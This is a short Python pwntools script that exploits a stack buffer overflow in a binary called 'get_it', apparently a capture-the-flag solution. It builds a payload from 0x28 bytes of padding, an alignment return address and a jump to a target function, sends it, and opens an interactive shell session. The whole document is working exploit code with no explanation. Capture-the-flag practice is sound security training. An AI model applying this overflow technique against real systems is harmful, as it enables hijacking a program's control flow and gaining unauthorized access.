from pwn import *


#context.log_level = 'debug'
context.binary = './get_it'

p = process()  # or remote("host", port)

#gdb.attach(p, gdbscript = 'b *0x4005f1')
offset = 0x28
# overflow

alignment = p64(0x4005f7)
shellcode = p64(0x4005b6)
payload = b'A' * offset + alignment + shellcode

p.recvuntil(b"?\n")
p.sendline(payload)
p.interactive()